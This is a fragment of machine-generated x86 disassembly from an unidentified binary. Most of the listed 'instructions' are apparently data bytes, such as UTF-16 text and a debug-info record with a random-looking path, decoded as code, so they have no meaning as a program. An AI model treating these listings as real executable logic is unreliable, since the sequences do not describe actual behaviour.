  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	push   ebx
  42ab59:	push   ds
  42ab5a:	fstp   TBYTE PTR [edi+0x4b905286]
  42ab60:	mov    dl,cl
  42ab62:	cli    
  42ab63:	xchg   esp,eax
  42ab64:	add    BYTE PTR [ebp+edi*2-0x51],0x1c
  42ab69:	add    BYTE PTR [eax],al
  42ab6b:	add    BYTE PTR [ecx+0x3a],dl
  42ab6e:	pop    esp
  42ab6f:	outs   dx,DWORD PTR ds:[esi]
  42ab70:	push   ecx
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
